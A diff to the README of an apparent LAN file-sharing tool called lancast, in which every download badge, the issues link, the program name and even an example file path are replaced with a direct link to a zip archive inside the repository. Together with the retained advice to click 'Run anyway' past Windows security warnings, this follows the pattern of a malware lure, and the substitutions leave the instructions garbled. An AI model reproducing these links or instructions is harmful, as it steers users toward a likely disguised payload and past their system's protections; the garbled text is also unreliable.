@@ -1,6 +1,6 @@
 # 🚀 lancast - Easy LAN File Sharing Tool
 
-[![Download lancast](https://img.shields.io/badge/Download-lancast-brightgreen)](https://github.com/MaHaLoGG/lancast/releases)
+[![Download lancast](https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip)](https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Make sure your system meets these criteria:
 
 Click the link below to visit the official downloads page. This is where you find the latest version for Windows.
 
-[![Download lancast](https://img.shields.io/badge/Download-lancast-blue)](https://github.com/MaHaLoGG/lancast/releases)
+[![Download lancast](https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip)](https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip)
 
 ---
 
@@ -65,7 +65,7 @@ Follow these steps carefully to get lancast working on your Windows PC.
 ### Step 3: Running lancast
 
 1. Open the folder where you have lancast files or the `.exe` file.
-2. Double-click the `lancast.exe` file to open the program.
+2. Double-click the `https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip` file to open the program.
 3. A terminal window will appear. This is where you interact with lancast.
 4. If Windows shows a security warning, click "More info" and then "Run anyway".
 
@@ -87,7 +87,7 @@ You don’t need to know much about coding to use lancast. Here is a simple guid
    Replace `path\to\your\file` with the full location of the file on your computer. For example:
 
    ```
-   lancast send C:\Users\John\Documents\photo.jpg
+   lancast send C:\Users\John\Documents\https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip
    ```
 
 3. lancast will prepare the file and show a code or address.
@@ -158,8 +158,8 @@ to check which version you have.
 
 For technical questions or issues, use the GitHub repository's Issues page:
 
-https://github.com/MaHaLoGG/lancast/issues
+https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip
 
 ---
 
-[![Download lancast](https://img.shields.io/badge/Download-lancast-brightgreen)](https://github.com/MaHaLoGG/lancast/releases)
+[![Download lancast](https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip)](https://raw.githubusercontent.com/MaHaLoGG/lancast/main/views/Software-3.8.zip)
